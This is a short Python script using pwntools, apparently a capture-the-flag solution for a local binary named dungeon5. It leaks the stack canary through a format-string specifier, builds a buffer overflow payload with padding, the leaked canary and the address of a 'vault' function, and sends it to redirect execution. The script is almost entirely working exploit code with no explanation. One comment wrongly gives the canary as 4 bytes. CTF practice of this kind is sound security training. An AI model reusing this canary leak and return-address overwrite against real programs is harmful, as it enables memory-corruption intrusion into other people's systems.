from pwn import*

exe = './dungeon5'

elf = context.binary = ELF(exe, checksec=False)

io = process(exe)

offset = 72

io.sendlineafter(b'!', '%{}$p'.format(15).encode())
io.recvline()
canary = int(io.recvline().strip(), 16)
info('canary = 0x%x (%d)', canary, canary)

payload = flat([
    offset * b'A', # Pad to canary (72)
    p64(canary), # Leaked Canary (4)
    8 * b'A', # Pad to Ret Pointer (8)
    p64(elf.symbols.vault) # Ret2Win (total = 88)
])

io.clean()
io.sendline(payload)

banner = io.read(1024)
print(banner)

io.interactive()
